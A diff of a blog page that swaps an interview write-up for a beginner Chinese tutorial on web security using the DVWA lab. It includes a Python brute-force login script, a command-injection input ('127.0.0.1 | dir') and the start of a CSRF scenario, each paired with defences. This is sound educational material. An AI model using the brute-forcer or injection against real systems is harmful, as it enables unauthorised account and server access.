@@ -37,7 +37,7 @@
     
     <title>
         
-            风际游戏-服务端面试 | 
+            Web安全入门 | 
         
         0xkernel
     </title>
@@ -49,7 +49,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="0xkernel">
     <meta name="description" itemprop="description" content="Linux、C/C++、Kernel、Computer science">
-    <meta name="keywords" content="Linux、C/C++、Kernel、Computer science,面试">
+    <meta name="keywords" content="Linux、C/C++、Kernel、Computer science">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -231,18 +231,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://www.0xkernel.com">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="风际游戏-服务端面试 | 0xkernel">
+    <meta property="og:title" content="Web安全入门 | 0xkernel">
     <meta property="og:image" content="http://www.0xkernel.com/img/favicon.png" />
     <meta property="og:description" content="Linux、C/C++、Kernel、Computer science">
-    <meta property="og:article:tag" content="面试"> 
+    
 
     
-        <meta property="article:published_time" content="Fri Sep 29 2017 23:48:01 GMT+0800" />
-        <meta property="article:modified_time" content="Sat Sep 30 2017 02:04:04 GMT+0800" />
+        <meta property="article:published_time" content="Fri Nov 17 2017 17:11:38 GMT+0800" />
+        <meta property="article:modified_time" content="Fri Nov 17 2017 20:33:20 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="风际游戏-服务端面试 | 0xkernel">
+    <meta name="twitter:title" content="Web安全入门 | 0xkernel">
     <meta name="twitter:description" content="Linux、C/C++、Kernel、Computer science">
     <meta name="twitter:image" content="http://www.0xkernel.com/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -250,7 +250,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/index.html" />
+        <link rel="canonical" href="http://www.0xkernel.com/2017/11/17/Web安全入门/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -262,10 +262,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/index.html",
-    "headline": "风际游戏-服务端面试",
-    "datePublished": "Fri Sep 29 2017 23:48:01 GMT+0800",
-    "dateModified": "Sat Sep 30 2017 02:04:04 GMT+0800",
+    "mainEntityOfPage": "http://www.0xkernel.com/2017/11/17/Web安全入门/index.html",
+    "headline": "Web安全入门",
+    "datePublished": "Fri Nov 17 2017 17:11:38 GMT+0800",
+    "dateModified": "Fri Nov 17 2017 20:33:20 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "0xkernel",
@@ -283,7 +283,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",面试Linux、C/C++、Kernel、Computer science",
+    "keywords": "Linux、C/C++、Kernel、Computer science",
     "description": "Linux、C/C++、Kernel、Computer science",
 }
 </script>
@@ -357,7 +357,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#一面"><span class="post-toc-number">2.</span> <span class="post-toc-text">一面</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#二面"><span class="post-toc-number">3.</span> <span class="post-toc-text">二面</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hr面"><span class="post-toc-number">4.</span> <span class="post-toc-text">hr面</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#暴力破解"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">暴力破解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景"><span class="post-toc-number">1.1.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法"><span class="post-toc-number">1.1.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法"><span class="post-toc-number">1.1.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#命令注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">命令注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-1"><span class="post-toc-number">1.2.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-1"><span class="post-toc-number">1.2.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-1"><span class="post-toc-number">1.2.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CSRF"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">CSRF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-2"><span class="post-toc-number">1.3.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-2"><span class="post-toc-number">1.3.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-2"><span class="post-toc-number">1.3.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件包含"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">文件包含</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-3"><span class="post-toc-number">1.4.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-3"><span class="post-toc-number">1.4.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-3"><span class="post-toc-number">1.4.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件上传"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">文件上传</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-4"><span class="post-toc-number">1.5.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-4"><span class="post-toc-number">1.5.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-4"><span class="post-toc-number">1.5.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQL回显注入"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">SQL回显注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-5"><span class="post-toc-number">1.6.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-5"><span class="post-toc-number">1.6.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-5"><span class="post-toc-number">1.6.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQL盲注"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">SQL盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-6"><span class="post-toc-number">1.7.0.0.1.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-6"><span class="post-toc-number">1.7.0.0.2.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-6"><span class="post-toc-number">1.7.0.0.3.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XSS"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">XSS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#分类"><span class="post-toc-number">1.8.0.0.1.</span> <span class="post-toc-text">分类</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#场景-7"><span class="post-toc-number">1.8.0.0.2.</span> <span class="post-toc-text">场景</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#利用方法-7"><span class="post-toc-number">1.8.0.0.3.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#防御方法-7"><span class="post-toc-number">1.8.0.0.4.</span> <span class="post-toc-text">防御方法</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#总结"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">总结</span></a></li></ol></li></ol>
     </ul>
     
 
@@ -389,7 +389,7 @@
         
     
             <p class="article-headline-p">
-                风际游戏-服务端面试
+                Web安全入门
             </p>
         </div>
 
@@ -408,7 +408,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>0xkernel</strong>
-        <span>9月 29, 2017</span>
+        <span>11月 17, 2017</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -426,15 +426,6 @@
 
     <!-- Tags (bookmark) -->
     
-    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-        <i class="material-icons" role="presentation">bookmark</i>
-        <span class="visuallyhidden">bookmark</span>
-    </button>
-    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
-        <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/面试/">面试</a>
-    </ul>
-    
 
     <!-- Share -->
     <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
@@ -448,7 +439,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=风际游戏-服务端面试&url=http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/index.html&pic=http://www.0xkernel.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Web安全入门&url=http://www.0xkernel.com/2017/11/17/Web安全入门/index.html&pic=http://www.0xkernel.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -457,7 +448,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=风际游戏-服务端面试&url=http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/index.html&via=0xkernel" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Web安全入门&url=http://www.0xkernel.com/2017/11/17/Web安全入门/index.html&via=0xkernel" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -466,7 +457,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://www.0xkernel.com/2017/11/17/Web安全入门/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -475,7 +466,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://www.0xkernel.com/2017/11/17/Web安全入门/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -499,11 +490,39 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&ensp;&ensp;&ensp;&ensp;前天我们学校有个“天府人才行动2017秋季校园行”（通俗的讲就是校园招聘）。由于现在用 C++ 的公司少之又少，于是我抱着去见见世面的心态去参加，就带了4份简历（我那时觉得我简历排版已经很好了，然而昨天就被我基友给完爆了）过去，还担心一份都投不出去（哎，不得不说现在C++的工作好少，基本上都是java的）。开始去了一个招聘游戏服务端开发的岗位，把简历递了过去，然而人家看了看我简历，说，我们服务端用的是Java，你会Java么？然后我就尴尬的走了。<br>&ensp;&ensp;&ensp;&ensp;我在看了看周围的公司，发现风际游戏招聘服务端开发，这次我就没有直接递简历，而是先问了问那个招聘的小姐姐，你们招聘的服务端开发是用c++的么？然后小姐姐说是，我就把我简历递上去了（我说了句，哇，有c++服务端开发的，小姐姐然后说：哈哈，看你一听c++服务端开发的，就高兴的递简历给我，是不是其他公司用的java啊，然后我就点了点头），然后小姐姐就看我简历，问了一些简历上面的项目，最后问了问单列模式的优缺点，然后给了我一张笔试地点的小纸条，最后给我说，我挺看好你的。<br>&ensp;&ensp;&ensp;&ensp;笔试时间是下午2点半，题目都是一些挺基础简单的东西。最后有个编程题是swap list node，leetcode上有。然后我晚上6点左右就收到了面试邀请。就今天去风际游戏公司参加面试了。<br>&ensp;&ensp;&ensp;&ensp;公司就在天府软件园，环境挺不错的。</p>
-<h2 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h2><p>&ensp;&ensp;&ensp;&ensp;到了公司，去了一个小型会议室那种房间里，然后等了一会儿，一个hr小姐姐就叫去我去另一个小房间里等待面试，然后我在那房间里等了会儿，一个和蔼的面试官就进来了，然后叫我做自我介绍(插曲:上次去四川大学望江校区面试一个实验室的一个开发岗位(get offer),那个面试官叫我自我介绍,我就直接照着简历上说,然后那个面试官就直接打住我,说简历上已经写了的你就不说,你就说说你平时的爱好,不用太紧张.不得不说,我挺感谢那面试官的指点,让我知道什么叫”自我介绍”,因为这样自我介绍后,我面前这个面试管看了我,很和蔼的笑了笑),<br>&ensp;&ensp;&ensp;&ensp;开始问我你最精通那种语音,然后我一脸蒙蔽,回了句”精通?”(内心OS:我特么敢说我精通某某语言,我就是找死啊),<br>&ensp;&ensp;&ensp;&ensp;面试官:”你觉得你对c++掌握的怎么样”,我:”一般吧”(内心OS:我特么敢说我熟悉,精通c++就是找虐,你还是慢慢来探索我的掌握度吧)<br>&ensp;&ensp;&ensp;&ensp;然后面试官就出了两道c++题,一道是内存对齐,一道是const ( const int func(const int a)const,这3个const的作用 ,接着问const成员函数,如何修改对象数据,我没答上来(mutable修饰)),const那道没答好.<br>&ensp;&ensp;&ensp;&ensp;然后问了问我简历上的一些项目，然后tcp与udp的区别，最后是reactor模式.就叫我等一会儿.因为const那道题没答好,我就觉得我已经GG了,就把桌上的简历收进包里,等hr小姐姐通知我,让我走人.<br>&ensp;&ensp;&ensp;&ensp;然而万万没想到的是,我还有下一个面试官.</p>
-<h2 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h2><p>&ensp;&ensp;&ensp;&ensp;另一个面试官(后面知道是那家公司的CTO)就进来了,也挺和蔼,亲人的那种,且一眼就可以看出是那种技术特牛逼的那种(有个小细节不得不为这个面试官点赞,就一面完之后,我趴在房间里窗口处的护栏旁,纠结我是坐公交回去,还是起单车回去,然后面试官就来了,因为我是背对着门,没看见面试官来了,面试官就敲了敲门,然后我就回过神,面试官朝我笑笑点点头进来了).<br>&ensp;&ensp;&ensp;&ensp;然后还是面试老套路,叫我自我介绍.自我介绍完了之后,就问我简历上的一些项目.Reactor模式.<br>&ensp;&ensp;&ensp;&ensp;面试官:”哇,你居然学过逆向工程”,我:”对”,(内心OS:哇,居然有面试官注意到这个,这个面试官貌似还学过这玩意).<br>&ensp;&ensp;&ensp;&ensp;然后问我,”你是自学的么”.我:”对”.<br>&ensp;&ensp;&ensp;&ensp;面试官:”你学一门新技术的话,你一般会怎么做”,我:”先去网上搜说对应技术的一些推荐书籍,然后在去豆瓣上看看评论,适不适合我读”.<br>&ensp;&ensp;&ensp;&ensp;面试官:”那你对以后的发展有什么计划没?”,我:”学习Go语言,然后学习分布式系统,在有业余的时间情况下学习Linux内核.然后找一个公司,学习业务编程.”<br>&ensp;&ensp;&ensp;&ensp;然后面试官问了我一些游戏的东西(不得不说还好我玩游戏,还好我初中,高中的时候搭建过私服.)<br>&ensp;&ensp;&ensp;&ensp;面试官:”你看过特南鲍姆的书么?”,我:”看过,&lt;&lt;现代操作系统&gt;&gt;,&lt;&lt;计算机网络&gt;&gt;,&lt;&lt;计算机组成结构化&gt;&gt;,然后现在准备看他那本分布式系统的书”,(内心OS:哈哈,还好特南鲍姆是我最喜欢的一个计算机科学家了,他那几本书我看过三本)<br>&ensp;&ensp;&ensp;&ensp;面试官:”你们学校是不是基本上都是学Java的”,我:”嗯”,面试官:”那你是你们学校的另类了”,我:”蛤?”,(内心OS:喵喵喵?褒义还是贬义?)<br>&ensp;&ensp;&ensp;&ensp;然后面试官问我,你有问题问我没?我就问了问服务器负载均衡.(二面有些细节记不起来了,且有些东西太高深了,我也听不懂,反正这个面试官思路特别清洗,技术特别牛)<br>&ensp;&ensp;&ensp;&ensp;然后面试就叫我去外面等结果.我就很自觉的来到公司的电梯哪里等待叫我滚蛋.</p>
-<h2 id="hr面"><a href="#hr面" class="headerlink" title="hr面"></a>hr面</h2><p>&ensp;&ensp;&ensp;&ensp;等了几分钟,然后hr小姐姐把我叫到另一个小房间,给我说你技术面过了.然后hr面基本没什么,就是谈薪,问多久来到岗.最后给了个口头offer,叫我做明天的智力测试与心里测试(智力测试我有点慌,怕是过不了哦).</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&ensp;&ensp;&ensp;&ensp;面试官没问数据结构与算法,有点失望,虽然我掌握的也就一般.然后有时候有些东西没有表达清楚,看来得多练练表达能力了,就从写博客开始吧!</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&ensp;&ensp;&ensp;&ensp;最近在公司做Linux下的PHP开发，所以乘此机会学习了下Web安全，了解了常见的Web安全漏洞，以及对应的防御方法(使用DVWA进行学习)。</p>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><h6 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;在类似用户登陆界面，如果系统没有限制用户的尝试次数，且没有验证码的情况下，就存在该漏洞</p>
+<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">URL = <span class="string">r'http://192.168.56.101/DVWA/vulnerabilities/brute/'</span>;<span class="comment">#破解地址</span></div><div class="line">cookies = dict(security=<span class="string">'medium'</span>, PHPSESSID=<span class="string">'4sijad6qd225aai8ha02tr82e3'</span>)<span class="comment">#cookie设置</span></div><div class="line"></div><div class="line">users = (<span class="string">"root"</span>,<span class="string">"system"</span>,<span class="string">"admin"</span>);<span class="comment">#用户库</span></div><div class="line">pwds = (<span class="string">"123123"</span>,<span class="string">"123456"</span>,<span class="string">"password"</span>,<span class="string">"root"</span>);<span class="comment">#密码库</span></div><div class="line"></div><div class="line">arguments = &#123;<span class="string">"username"</span>:<span class="string">""</span>,<span class="string">"password"</span>:<span class="string">""</span>,<span class="string">"Login"</span>:<span class="string">"Login"</span>&#125;;<span class="comment">#构造请求参数</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</div><div class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> pwds:</div><div class="line">        arguments[<span class="string">'username'</span>] = user;</div><div class="line">        arguments[<span class="string">'password'</span>] = pwd;</div><div class="line"></div><div class="line">        r = requests.get(URL,arguments,cookies=cookies);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> r.text.find(<span class="string">"Username and/or password incorrect."</span>) == <span class="number">-1</span>:<span class="comment">#判断是否成功破解</span></div><div class="line">            print(user,pwd);</div><div class="line">            exit(<span class="number">0</span>);</div><div class="line"></div><div class="line">print(<span class="string">"defeat"</span>);</div></pre></td></tr></table></figure>
+<h6 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;添加验证码,限制尝试次数。</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h6 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;web服务器接受用户提交的数据，作为系统命令或程序的参数，这种情况下就会容易造成命令注入。</p>
+<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p>&ensp;&ensp;&ensp;&ensp;传入参数，构造另一个命令，比如web程序接受一个ip地址作为ping命令的参数，则我们可以传入’127.0.0.1 | dir’,则dir会执行。</p>
+<h6 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;使用白名单。严格限制用户的输入，比如你想要一个ip地址，则必须在服务端验证用户输入的是否是一个ip地址， 永远不要相信用户提交的数据</p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h6 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;在一个转账网站下，存在两个用户，用户A构造一个恶意网站给用户B，用户B单击后，自己账号中的钱全部转给了用户A。</p>
